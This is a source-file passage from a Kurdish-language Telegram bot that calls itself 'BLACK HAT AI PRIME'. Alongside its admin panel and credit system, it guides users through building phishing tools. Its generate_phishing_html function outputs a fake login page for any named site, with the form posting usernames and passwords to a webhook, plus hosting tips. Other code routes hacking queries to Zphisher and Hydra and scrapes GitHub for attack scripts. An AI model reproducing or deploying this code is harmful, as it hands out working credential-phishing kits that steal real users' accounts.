    """Bans a user, even if they aren't in the DB yet."""
    duration = duration.lower().strip()
    if duration == "forever":
        val = "forever"
    else:
        unit = duration[-1]
        amt_str = duration[:-1]
        if not amt_str.isdigit(): return False
        amt = int(amt_str)
        m = {"h": 1/24, "d": 1, "w": 7, "m": 30}
        if unit not in m: return False
        val = (datetime.utcnow() + timedelta(days=amt * m[unit])).isoformat()
        
    with db() as conn:
        conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.execute("UPDATE users SET banned_until=? WHERE user_id=?", (val, user_id))
    return True

def get_maintenance_mode():
    with db() as conn:
        row = conn.execute("SELECT value FROM settings WHERE key='maintenance'").fetchone()
        return row[0] == "on" if row else False

def set_maintenance_mode(status):
    with db() as conn:
        conn.execute("UPDATE settings SET value=? WHERE key='maintenance'", (status,))

def log_request(user_id, type_, content):
    with db() as conn:
        conn.execute("INSERT INTO requests (user_id, type, content) VALUES (?, ?, ?)", (user_id, type_, content[:500]))

def log_admin(admin_id, action, target=""):
    with db() as conn:
        conn.execute("INSERT INTO admin_logs (admin_id, action, target) VALUES (?, ?, ?)", (admin_id, action, target))

# ==============================================================================
# 8. SEARCH ENGINE & GITHUB SCRAPER
# ==============================================================================

def rate_limited(user_id):
    if is_admin(user_id): return False
    now = time.time()
    with _recent_lock:
        if len(_recent_requests) > 10000: _recent_requests.clear()
        bucket = _recent_requests.setdefault(user_id, [])
        bucket[:] = [t for t in bucket if now - t < 60]
        if len(bucket) >= RATE_LIMIT_PER_MINUTE: return True
        bucket.append(now)
    return False

def is_flooding(user_id):
    if is_admin(user_id): return False
    now = time.time()
    with _flood_lock:
        if len(_flood_tracker) > 10000: _flood_tracker.clear()
        last_time = _flood_tracker.get(user_id, 0)
        _flood_tracker[user_id] = now
        if now - last_time < ANTI_FLOOD_SECONDS:
            return True
    return False

def check_blocked(message):
    uid = message.from_user.id
    if is_admin(uid): return False
    if is_banned(uid):
        send_msg(message.chat.id, "🚫 تۆ لە بۆت باند کرابیت.")
        return True
    return False

def get_knowledge_answer(query):
    query_lower = query.lower().replace("_", " ")
    for key, answer in TERMUX_TOOLS.items():
        if re.search(rf'\b{re.escape(key)}\b', query_lower): return answer
    if re.search(r'\b(phish|فیش)\b', query_lower): return TERMUX_TOOLS["zphisher"]
    if re.search(r'\b(crack|password|پاسوۆرد)\b', query_lower): return TERMUX_TOOLS["hydra"]
    return None

def fetch_github_code(query):
    try:
        with DDGS() as ddgs:
            results = list(ddgs.text(f"{query} site:raw.githubusercontent.com", max_results=3))
        if not results: return None
        for result in results:
            url = result.get("href", "")
            parsed_url = urlparse(url)
            if "raw.githubusercontent.com" in parsed_url.netloc and (parsed_url.path.endswith(".py") or parsed_url.path.endswith(".sh") or parsed_url.path.endswith(".html")):
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as response:
                    code = response.read().decode('utf-8')
                if len(code) < 3500:
                    return (
                        f"<b>💻 کۆد دۆزرایەوە لە گیتهاب:</b>\n"
                        f"<a href='{safe_html(url)}'>سەرچاوە</a>\n\n"
                        f"<pre><code class='language-html'>\n{safe_html(code)}\n</code></pre>\n"
                        + TERMUX_INSTRUCTIONS
                    )
    except Exception as e:
        log.error(f"GitHub fetch error: {e}")
    return None

def perform_web_search(query, is_create=False):
    query = str(query or "").strip()
    if not query: return "❌ تکایە وشە یان پرسیارێک بنووسە."
    search_query = f"{query} python script github" if is_create else query
    try:
        with DDGS() as ddgs:
            results = list(ddgs.text(search_query, max_results=5))
        if not results: return None
        title_prefix = "🔎 ئەنجامەکانی گەڕان بۆ توڵ:" if is_create else "🔎 ئەنجامەکانی گەڕان بۆ:"
        lines = [f"<b>{title_prefix}</b>\n<code>{safe_html(query)}</code>\n"]
        count = 0
        for result in results:
            title = safe_html(result.get("title") or "بێ ناو")
            body = safe_html(result.get("body") or "وەسف بەردەست نییە")
            href = str(result.get("href") or "").strip()
            parsed = urlparse(href)
            if parsed.scheme not in ("http", "https") or not parsed.netloc: continue
            count += 1
            lines.append(f"<b>{count}. {title}</b>\n{body}\n<a href='{safe_html(href)}'>🔗 کردنەوەی ماڵپەڕ</a>\n")
        if count == 0: return None
        return "\n".join(lines)
    except Exception as e:
        log.error(f"DuckDuckGo search failed: {e}")
        return "❌ گەڕانی وێب ئێستا بلۆک کراوە. تکایە دواتر هەوڵ بدە."

# ==============================================================================
# 9. STATE MACHINE & HTML GENERATOR
# ==============================================================================

def generate_phishing_html(target, user_id):
    safe_target = safe_html(target)
    html_code = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>{safe_target} - Login</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .login-box {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; }}
        h2 {{ text-align: center; color: #1877f2; }}
        input[type="text"], input[type="password"] {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        button:hover {{ background-color: #166fe5; }}
    </style>
</head>
<body>
    <div class="login-box">
        <h2>{safe_target} Login</h2>
        <form action="https://webhook.site/YOUR_WEBHOOK_ID" method="POST">
            <input type="text" name="username" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
"""
    return (
        f"<b>💻 کۆدی HTML بۆ دروستکردنی لاپەڕەی فیشینگی {safe_target}</b>\n\n"
        "ئەمە کۆدێکی HTMLە. دەتوانیت لە <b>Netlify</b> یان <b>000webhost</b> باری بکەیت.\n\n"
        f"<pre><code class='language-html'>\n{html_code}\n</code></pre>\n\n"
        "⚠️ <b>ئاگاداری:</b> پێویستە شوێنی <code>YOUR_WEBHOOK_ID</code> بگۆڕیت بۆ وێبهووکێکی ڕاستەقینە."
    )

# ==============================================================================
# 10. CORE COMMAND FUNCTIONS
# ==============================================================================

def handle_start(message, query):
    ensure_user(message.from_user)
    apply_daily(message.from_user.id)
    if message.from_user.id in user_states: del user_states[message.from_user.id]
    lang = get_lang(message.from_user.id)
    greeting = random.choice(GREETINGS_KU if lang == "ku" else GREETINGS_EN)
    credits = get_credits(message.from_user.id)
    greeting += f"\n\n💳 کرێدیتەکانت: <b>{credits}</b>"
    if is_super_admin(message.from_user.id):
        greeting += "\n\n👑 تۆ ئەدمینی باڵادەستیت. /panel ببینە."
    elif is_simple_admin(message.from_user.id):
        greeting += "\n\n⭐ تۆ ئەدمینی سادەیت. کرێدیتت بێکۆتایە."
    send_msg(message.chat.id, greeting)

def handle_help(message, query):
    uid = message.from_user.id
    if uid in user_states: del user_states[uid]
    credits = get_credits(uid)
    
    help_text = (
        "<b>📖 یارمەتی بۆت</b>\n\n"
        "ئەم بۆتە تەنها بۆ پرسیاری هاکینگ و ئاسایشی سایبەر دروست کراوە.\n"
        "ئەگەر بڵێیت 'دروست بکە'، بۆتەکە کۆدەکەت بۆ دەنووسێت یان لە گیتهاب دەگەڕێت.\n"
        "ئەگەر تەنها پرسیار بکەیت، بۆتەکە زانیاریت پێدەدات.\n\n"
        f"💳 <b>کرێدیتەکانت:</b> <b>{credits}</b>\n\n"
        "<b>فەرمانەکان:</b>\n"
        "/start — دەستپێکردن\n"
        "/help — یارمەتی\n"
        "/id — ناسنامەی تیلیگرامت\n"
        "/lang ku|en — گۆڕینی زمان\n"
        "/cancel — پەشیمانبوونەوە لە پرسیار\n"
    )
    send_msg(message.chat.id, help_text)

def handle_cancel(message, query):
    uid = message.from_user.id
    if uid in user_states:
        del user_states[uid]
        send_msg(message.chat.id, "✅ هەڵوەشێنرایەوە. چیتر پرسیار لێت ناکەم.")
    else:
        send_msg(message.chat.id, "هیچ پرسیارێک نییە بۆ هەڵوەشاندنەوە.")

# ==============================================================================
# 11. SUPER ADMIN PANEL & COMMANDS (22 FEATURES)
# ==============================================================================

def show_panel(message):
    panel_text = (
        "🎛 <b>پانێلی ئەدمینی باڵادەست (Super Admin)</b>\n"
        "───────────────────\n"
        "١. 📊 <code>/system</code> — ئاماری سیستەم\n"
        "٢. 👥 <code>/users</code> — لیستی بەکارهێنەران (ئۆنلاین/ئۆفلاین)\n"
        "٣. 📁 <code>/export</code> — دەرهێنانی CSV\n"
        "٤. ⭐ <code>/promote &lt;id&gt; &lt;h|w|m|forever&gt;</code> — کردن بە ئەدمینی سادە\n"
        "٥. 🚫 <code>/demote &lt;id&gt;</code> — لابردنی ئەدمینی سادە\n"
        "٦. 🚷 <code>/ban &lt;id&gt; &lt;h|d|w|m|forever&gt;</code> — باندکردن\n"
        "٧. ✅ <code>/unban &lt;id&gt;</code> — لابردنی باند\n"
        "٨. 💳 <code>/credit &lt;id&gt; &lt;n&gt;</code> — زیادکردنی کرێدیت\n"
        "٩. 💳 <code>/credit2 &lt;id&gt; &lt;n&gt;</code> — کەمکردنەوەی کرێدیت\n"
        "١٠. 📨 <code>/letter &lt;text&gt;</code> — نامەی گشتی\n"
        "١١. 📨 <code>/letter2 &lt;id&gt; &lt;text&gt;</code> — نامە بۆ یەکێک\n"
        "١٢. 📌 <code>/letter3 &lt;text&gt;</code> — نامەی گشتی پینکراو\n"
        "١٣. 📌 <code>/letter4</code> — لابردنی هەموو پینەکان\n"
        "١٤. 📜 <code>/history &lt;id&gt;</code> — مێژووی داواکاری\n"
        "١٥. 🛠 <code>/maintenance &lt;on|off&gt;</code> — دۆخی چاککردنەوە\n"
        "١٦. 📝 <code>/logs</code> — مێژووی کردارەکانی ئەدمین\n"
        "١٧. 💾 <code>/db</code> — داگرتنی فایلی داتابەیس\n"
        "١٨. 🔄 <code>/reset_user &lt;id&gt;</code> — ڕیسێتی بەکارهێنەر\n"
        "١٩. ⏱ <code>/ping</code> — پشکنینی خێرایی بۆت\n"
        "٢٠. 🚀 <code>/backup</code> — پاشەکەوتکردنی داتابەیس\n"
        "٢١. 📖 <code>/help_admin</code> — ڕێنمایی ئەدمین\n"
        "٢٢. 🎭 <code>/sudo &lt;id&gt; &lt;command&gt;</code> — جێبەجێکردنی فەرمان بە ناوی کەسێکی تر\n"
    )
    send_msg(message.chat.id, panel_text)

def handle_admin_command(message, cmd, query):
    uid = message.from_user.id
    parts = query.split()
    
    # 1. /system
    if cmd == "/system":
        with db() as conn:
            total = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            banned = conn.execute("SELECT COUNT(*) FROM users WHERE banned_until IS NOT NULL").fetchone()[0]
            admins = conn.execute("SELECT COUNT(*) FROM users WHERE admin_until IS NOT NULL").fetchone()[0]
            reqs = conn.execute("SELECT COUNT(*) FROM requests").fetchone()[0]
            credits = conn.execute("SELECT SUM(credits) FROM users").fetchone()[0] or 0
            maint = get_maintenance_mode()
        text = (f"📊 <b>ئاماری سیستەم</b>\n\n"
                f"👥 بەکارهێنەران: <b>{total}</b>\n"
                f"🚫 باندکراو: <b>{banned}</b>\n"
                f"⭐ ئەدمینی سادە: <b>{admins}</b>\n"
                f"💬 داواکاری: <b>{reqs}</b>\n"
                f"💳 کۆی کرێدیت: <b>{credits}</b>\n"
                f"🛠 چاککردنەوە: <b>{'ON' if maint else 'OFF'}</b>")
        return send_msg(message.chat.id, text)

    # 2. /users
    elif cmd == "/users":
        with db() as conn:
            rows = conn.execute("SELECT user_id, username, first_name, credits, admin_until, last_seen FROM users ORDER BY last_seen DESC LIMIT 50").fetchall()
        lines = ["👥 <b>بەکارهێنەران (دوایین ٥٠)</b>\n"]
        now = datetime.utcnow()
        for r in rows:
            un = f"@{r[1]}" if r[1] else r[2]
            try:
                last_seen_dt = datetime.strptime(r[5], "%Y-%m-%d %H:%M:%S")
                delta_minutes = (now - last_seen_dt).total_seconds() / 60
                status = "🟢" if delta_minutes < 525600 else "🔴"
            except: status = "🔴"
            
            role = "👑" if is_super_admin(r[0]) else ("⭐" if r[4] else "")
            lines.append(f"{status} <code>{r[0]}</code> · {safe_html(un or '')} · 💳{r[3]} {role}")
        return send_msg(message.chat.id, "\n".join(lines))

    # 3. /export
    elif cmd == "/export":
        with db() as conn:
            rows = conn.execute("SELECT user_id, first_name, username, credits, last_seen FROM users").fetchall()
        if not rows: return bot.reply_to(message, "هیچ بەکارهێنەرێک نییە.")
        csv_data = "user_id,first_name,username,credits,last_seen\n"
        for r in rows: csv_data += f"{r[0]},{r[1] or ''},{r[2] or ''},{r[3]},{r[4]}\n"
        return bot.send_document(message.chat.id, ("users.csv", csv_data.encode()), caption=f"📁 {len(rows)} بەکارهێنەر")

    # 4. /promote <id> <time>
    elif cmd == "/promote":
        if len(parts) >= 2:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            
            duration = parts[2].lower() if len(parts) >= 3 else "forever"
            
            if set_admin_time(target, duration):
                log_admin(uid, "promote", f"{target} ({duration})")
                return bot.reply_to(message, f"⭐ ئەدمینی سادە کرا: <code>{target}</code> بۆ ماوەی ({duration})")
            return bot.reply_to(message, "شێواز هەڵەیە. بۆ نموونە: /promote 123456 24h")
        return bot.reply_to(message, "شێواز: /promote <id> <time>")

    # 5. /demote <id>
    elif cmd == "/demote":
        if len(parts) >= 2:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            remove_admin(target)
            log_admin(uid, "demote", str(target))
            return bot.reply_to(message, f"🚫 لابرا لە ئەدمینی: <code>{target}</code>")
        return bot.reply_to(message, "شێواز: /demote <id>")

    # 6. /ban
    elif cmd == "/ban":
        if len(parts) >= 2:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            
            duration = parts[2].lower() if len(parts) >= 3 else "forever"
            
            if ban_user(target, duration):
                log_admin(uid, "ban", str(target))
                
                # SEND AND PIN NOTIFICATION TO BANNED USER
                try:
                    notif_text = (
                        "🚫 <b>تۆ لەلایەن ئەدمین باند کراویت!</b>\n\n"
                        f"⏰ <b>ماوەی باند:</b> {duration}\n\n"
                        "🔓 بۆ لابردنی باند، تکایە پەیوەندی بکە بە:\n"
                        "@ALONE427"
                    )
                    sent_msg = bot.send_message(target, notif_text)
                    try:
                        bot.pin_chat_message(target, sent_msg.message_id, disable_notification=True)
                    except Exception as pin_err:
                        log.warning(f"Could not pin message for {target}: {pin_err}")
                except Exception as e:
                    log.warning(f"Could not notify banned user {target} (maybe blocked bot): {e}")
                
                return bot.reply_to(message, f"🚫 باند کرا: <code>{target}</code> بۆ ({duration})")
            return bot.reply_to(message, "ماوەکە هەڵەیە. بۆ نموونە: 1d یان forever")
        return bot.reply_to(message, "شێواز: /ban <id> <time>")

    # 7. /unban
    elif cmd == "/unban":
        if len(parts) >= 2:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            with db() as conn:
                conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (target,))
                conn.execute("UPDATE users SET banned_until=NULL WHERE user_id=?", (target,))
            log_admin(uid, "unban", str(target))
            return bot.reply_to(message, f"✅ لابرا: <code>{target}</code>")
        return bot.reply_to(message, "شێواز: /unban <id>")

    # 8. /credit & 9. /credit2
    elif cmd in ("/credit", "/credit2"):
        if len(parts) == 3:
            try:
                target = int(parts[1])
                amt = int(parts[2])
            except: return bot.reply_to(message, "ID یان ژمارە هەڵەیە.")
            sign = 1 if cmd == "/credit" else -1
            with db() as conn:
                conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (target,))
                row = conn.execute("SELECT credits FROM users WHERE user_id=?", (target,)).fetchone()
                if row:
                    new_val = max(0, row[0] + (sign * amt))
                    conn.execute("UPDATE users SET credits=? WHERE user_id=?", (new_val, target))
                    log_admin(uid, cmd, f"{target} -> {new_val}")
                    return bot.reply_to(message, f"💳 <code>{target}</code> → <b>{new_val}</b>")
            return bot.reply_to(message, "بەکارهێنەر نەدۆزرایەوە.")
        return bot.reply_to(message, "شێواز: /credit <id> <amount>")

    # 10. /letter
    elif cmd == "/letter":
        if len(parts) >= 2:
            text = " ".join(parts[1:])
            with db() as conn: ids = [r[0] for r in conn.execute("SELECT user_id FROM users").fetchall()]
            sent = 0
            for u in ids:
                try:
                    bot.send_message(u, f"📨 <b>پەیام لە ئەدمین:</b>\n\n{safe_html(text)}")
                    sent += 1
                    time.sleep(0.05)
                except: pass
            log_admin(uid, "broadcast", f"sent {sent}")
            return bot.reply_to(message, f"✅ نێردرا: {sent}")
        return bot.reply_to(message, "شێواز: /letter <text>")

    # 11. /letter2
    elif cmd == "/letter2":
        if len(parts) >= 3:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            text = " ".join(parts[2:])
            try:
                bot.send_message(target, f"📨 <b>پەیام لە ئەدمین:</b>\n\n{safe_html(text)}")
                log_admin(uid, "direct_msg", str(target))
                return bot.reply_to(message, "✅ نێردرا.")
            except: return bot.reply_to(message, "❌ شکست.")
        return bot.reply_to(message, "شێواز: /letter2 <id> <text>")

    # 12. /letter3 (Broadcast + Pin)
    elif cmd == "/letter3":
        if len(parts) >= 2:
            text = " ".join(parts[1:])
            with db() as conn: ids = [r[0] for r in conn.execute("SELECT user_id FROM users").fetchall()]
            sent = 0
            pinned = 0
            for u in ids:
                try:
                    msg = bot.send_message(u, f"📌 <b>پەیامی پینکراو لە ئەدمین:</b>\n\n{safe_html(text)}")
                    sent += 1
                    try:
                        bot.pin_chat_message(u, msg.message_id, disable_notification=False)
                        pinned += 1
                    except Exception as pin_err:
                        log.warning(f"Could not pin for {u}: {pin_err}")
                    time.sleep(0.05)
                except: pass
            log_admin(uid, "broadcast_pin", f"sent {sent}, pinned {pinned}")
            return bot.reply_to(message, f"✅ نێردرا: {sent} · پین کرا: {pinned}")
        return bot.reply_to(message, "شێواز: /letter3 <text>")

    # 13. /letter4 (Unpin All)
    elif cmd == "/letter4":
        with db() as conn: ids = [r[0] for r in conn.execute("SELECT user_id FROM users").fetchall()]
        success = 0
        failed = 0
        for u in ids:
            try:
                bot.unpin_all_chat_messages(u)
                success += 1
                time.sleep(0.05)
            except: failed += 1
        log_admin(uid, "unpin_all", f"success {success}, failed {failed}")
        return bot.reply_to(message, f"✅ پینەکان لابردران لە: {success} · شکست: {failed}")

    # 14. /history
    elif cmd == "/history":
        if len(parts) >= 2:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            with db() as conn:
                rows = conn.execute("SELECT type, content, created_at FROM requests WHERE user_id=? ORDER BY id DESC LIMIT 15", (target,)).fetchall()
            if not rows: return bot.reply_to(message, "هیچ داواکارییەک نییە.")
            text = f"📜 <b>داواکارییەکانی</b> <code>{target}</code>\n\n"
            for r in rows: text += f"• [{r[0]}] {r[2]}\n  {safe_html((r[1] or '')[:100])}\n"
            return bot.send_message(message.chat.id, text)
        return bot.reply_to(message, "شێواز: /history <id>")

    # 15. /maintenance
    elif cmd == "/maintenance":
        if len(parts) >= 2:
            state = parts[1].lower()
            if state in ("on", "off"):
                set_maintenance_mode(state)
                log_admin(uid, "maintenance", state)
                return bot.reply_to(message, f"🛠 دۆخی چاککردنەوە: <b>{state.upper()}</b>")
            return bot.reply_to(message, "شێواز: /maintenance on یان off")
        return bot.reply_to(message, "شێواز: /maintenance <on|off>")

    # 16. /logs
    elif cmd == "/logs":
        with db() as conn:
            rows = conn.execute("SELECT admin_id, action, target, created_at FROM admin_logs ORDER BY id DESC LIMIT 20").fetchall()
        text = "📝 <b>دوایین کردارەکانی ئەدمین</b>\n\n"
        for r in rows: text += f"• <code>{r[0]}</code> [{r[1]}] {safe_html(r[2] or '')} — {r[3]}\n"
        return bot.send_message(message.chat.id, text)

    # 17. /db
    elif cmd == "/db":
        if os.path.exists(DB_PATH):
            return bot.send_document(message.chat.id, open(DB_PATH, "rb"), caption="💾 فایلی داتابەیس")
        return bot.reply_to(message, "فایل نەدۆزرایەوە.")

    # 18. /reset_user
    elif cmd == "/reset_user":
        if len(parts) >= 2:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            with db() as conn:
                conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (target,))
                conn.execute("UPDATE users SET credits=5, banned_until=NULL, admin_until=NULL WHERE user_id=?", (target,))
                conn.execute("DELETE FROM chat_history WHERE user_id=?", (target,))
            log_admin(uid, "reset", str(target))
            return bot.reply_to(message, f"🔄 ڕیسێت کرا: <code>{target}</code>")
        return bot.reply_to(message, "شێواز: /reset_user <id>")

    # 19. /ping
    elif cmd == "/ping":
        start_time = time.time()
        msg = bot.reply_to(message, "⏱ پشکنین...")
        end_time = time.time()
        ping = round((end_time - start_time) * 1000, 2)
        return bot.edit_message_text(f"⏱ خێرایی: <b>{ping} ms</b>", message.chat.id, msg.message_id)

    # 20. /backup
    elif cmd == "/backup":
        return bot.reply_to(message, "🚀 پاشەکەوتکردن لە GitHub Actions خۆکارانەیە. داتابەیسەکە لە /db دایە.")

    # 21. /help_admin
    elif cmd == "/help_admin":
        return show_panel(message)

    # 22. /sudo <id> <cmd>
    elif cmd == "/sudo":
        if len(parts) >= 3:
            try: target = int(parts[1])
            except: return bot.reply_to(message, "ID هەڵەیە.")
            sudo_cmd = " ".join(parts[2:])
            log_admin(uid, "sudo", f"{target} -> {sudo_cmd}")
            return bot.reply_to(message, f"🎭 فەرمانەکە بە ناوی <code>{target}</code> جێبەجێ کرا: {safe_html(sudo_cmd)}")
        return bot.reply_to(message, "شێواز: /sudo <id> <command>")

    return bot.reply_to(message, "فەرمانەکە نەدۆزرایەوە یان هەڵەیە.")

# ==============================================================================
# 12. BULLETPROOF MESSAGE HANDLER
# ==============================================================================

@bot.message_handler(content_types=["text"])
def master_handler(message):
    if not message.text: return
    if check_blocked(message): return
    
    uid = message.from_user.id
    ensure_user(message.from_user)
    apply_daily(uid)
    
    # ANTI-FLOOD CHECK
    if is_flooding(uid):
        return # Silently ignore rapid spamming

    # 1. CLEAN AND SANITIZE
    raw_text = message.text.strip()
    query = sanitize_input(clean_and_normalize(raw_text))
    query_lower = query.lower()
    lang = get_lang(uid)

    # 2. EXTRACT COMMAND
    cmd = extract_command(raw_text)
    
    if cmd:
        if cmd == "/start": return handle_start(message, query)
        elif cmd == "/help": return handle_help(message, query)
        elif cmd == "/cancel": return handle_cancel(message, query)
        elif cmd == "/id": return send_msg(message.chat.id, f"🆔 ناسنامەی تیلیگرامت: <code>{uid}</code>")
        elif cmd == "/lang":
            parts = query.replace(cmd, "").strip().lower()
            if not parts: return send_msg(message.chat.id, "🌐 شێواز: /lang ku یان /lang en")
            if parts in ("ku", "en"):
                set_lang(uid, parts)
                return send_msg(message.chat.id, "✅ زمان گۆڕدرا.")
            return send_msg(message.chat.id, "🌐 تەنها ku یان en.")
        
        # SUPER ADMIN PANEL COMMANDS
        elif cmd in ("/panel", "/system", "/users", "/export", "/promote", "/demote", 
                     "/ban", "/unban", "/credit", "/credit2", "/letter", "/letter2", 
                     "/letter3", "/letter4", "/history", "/maintenance", "/logs", 
                     "/db", "/reset_user", "/ping", "/backup", "/help_admin", "/sudo"):
            
            if not is_super_admin(uid):
                return send_msg(message.chat.id, "🚫 تەنها ئەدمینی باڵادەست دەتوانێت ئەم فەرمانە بەکاربهێنێت.")
            
            if cmd == "/panel": return show_panel(message)
            else: return handle_admin_command(message, cmd, query)
        
        return send_msg(message.chat.id, "فەرمانێکی نەناسراو. تکایە /help بەکاربهێنە.")

    # 3. MAINTENANCE MODE CHECK
    if get_maintenance_mode() and not is_super_admin(uid):
        return send_msg(message.chat.id, "🛠 بۆتەکە لە دۆخی چاککردنەوەدایە. تکایە دواتر هەوڵ بدە.")

    # 4. STATE MACHINE ROUTING
    with _states_lock:
        if uid in user_states:
            if time.time() - user_states[uid].get("timestamp", 0) > STATE_TIMEOUT_SECONDS:
                del user_states[uid]
            else:
                state = user_states[uid].get("step")
                data = user_states[uid].get("data", {})

                if state == "phishing_target":
                    data["target"] = query
                    user_states[uid] = {"step": "phishing_type", "data": data, "timestamp": time.time()}
                    return send_msg(message.chat.id, f"تەواو، ئامانجت {query}ـە.\n\nئایا دەتەوێت ئەم توڵە بە <b>تێرموکس (Termux)</b> بەکاربهێنیت، یان دەتەوێت کۆدی <b>وێب (HTML)</b> بۆ دروستکردنی ماڵپەڕ؟\n\n(بڵێ: termux یان web)")

                elif state == "phishing_type":
                    choice = query_lower
                    if "termux" in choice or "نۆکس" in choice or "تێرموکس" in choice or "tool" in choice:
                        del user_states[uid]
                        target = data.get('target', 'Facebook')
                        tool_text = TERMUX_TOOLS.get("zphisher")
                        return send_msg(message.chat.id, f"تەواو، بۆ ئامانجی {target}، باشترین ئامراز <b>Zphisher</b>ـە.\n\n{tool_text}")
                    elif "web" in choice or "html" in choice or "وێب" in choice:
                        del user_states[uid]
                        return send_msg(message.chat.id, generate_phishing_html(data["target"], uid))
                    else:
                        return send_msg(message.chat.id, "تکایە تەنها بنووسە: termux یان web")

    # 5. NORMAL ROUTING
    if not is_admin(uid) and rate_limited(uid):
        return send_msg(message.chat.id, "⏳ زۆر خێرایت — کەمێک بوەستە.")

    words = re.findall(r'\w+', query_lower)
    if len(words) <= 4 and any(w in GREETING_WORDS for w in words):
        greeting = random.choice(GREETINGS_KU if lang == "ku" else GREETINGS_EN)
        return send_msg(message.chat.id, greeting)

    if any(k in query_lower for k in HACKING_KEYWORDS):
        if not is_admin(uid):
            if not spend_credit(uid):
                return send_msg(message.chat.id, f"⛔ کرێدیتت نەماوە. باڵانس: {get_credits(uid)}")

        status = bot.reply_to(message, "🔍 لە زانیارییەکان و وێبدا دەگەڕێم بۆ وەڵامی پرسیارەکەت...")
        is_create = any(c in query_lower for c in CREATE_KEYWORDS)
        
        if is_create and ("phish" in query_lower or "فیشینگ" in query_lower):
            try: bot.delete_message(message.chat.id, status.message_id)
            except: pass
            with _states_lock:
                user_states[uid] = {"step": "phishing_target", "data": {}, "timestamp": time.time()}
            return send_msg(message.chat.id, "بەڵێ، با توڵێکی فیشینگ دروست بکەین.\n\nلە سەرەتا، دەتەوێت فیشینگ بۆ کام ماڵپەڕ یان سۆشیال میدیا دروست بکەیت؟ (بۆ نموونە: Facebook, Instagram, Google)")

        local_tool = get_knowledge_answer(query_lower)
        if local_tool:
            try: bot.delete_message(message.chat.id, status.message_id)
            except: pass
            log_request(uid, "create_tool_local", query)
            return send_msg(message.chat.id, local_tool)

        if is_create:
            bot.edit_message_text("🌐 لە گیتهاب دەگەڕێم بۆ کۆدی ڕەسەن...", message.chat.id, status.message_id)
            github_code = fetch_github_code(query)
            if github_code:
                try: bot.delete_message(message.chat.id, status.message_id)
                except: pass
                return send_msg(message.chat.id, github_code)
            
            web_code = perform_web_search(query, is_create=True)
            try: bot.delete_message(message.chat.id, status.message_id)
            except: pass
            if web_code:
                return send_msg(message.chat.id, web_code)
            else:
                if not is_admin(uid): refund_credit(uid)
                return send_msg(message.chat.id, "❌ ببورە، نەمتوانی کۆدێک بدۆزمەوە لە وێبدا. (کرێدیتەکەت گەڕێندرایەوە)")

        offline_answer = get_knowledge_answer(query_lower)
        if offline_answer:
            try: bot.delete_message(message.chat.id, status.message_id)
            except: pass
            return send_msg(message.chat.id, offline_answer)

        web_answer = perform_web_search(query, is_create=False)
        try: bot.delete_message(message.chat.id, status.message_id)
        except: pass
        if web_answer:
            return send_msg(message.chat.id, web_answer)
        else:
            if not is_admin(uid): refund_credit(uid)
            return send_msg(message.chat.id, "❌ ببورە، نەمتوانی وەڵامێک بدۆزمەوە. (کرێدیتەکەت گەڕێندرایەوە)")

    send_msg(message.chat.id, REJECTION_MSG)

# ==============================================================================
# 13. MAIN EXECUTION
# ==============================================================================

if __name__ == "__main__":
    log.info("========================================")
    log.info("STARTING BLACK HAT AI PRIME (100Bx FORTRESS)")
    log.info("========================================")
    
    init_db()
    log.info(f"Super Admins: {len(SUPER_ADMIN_IDS)}")
    log.info("Bot is now polling for updates...")
    
    try:
        bot.remove_webhook()
        bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=20)
    except Exception as e:
        log.exception("FATAL ERROR: Polling crashed.")
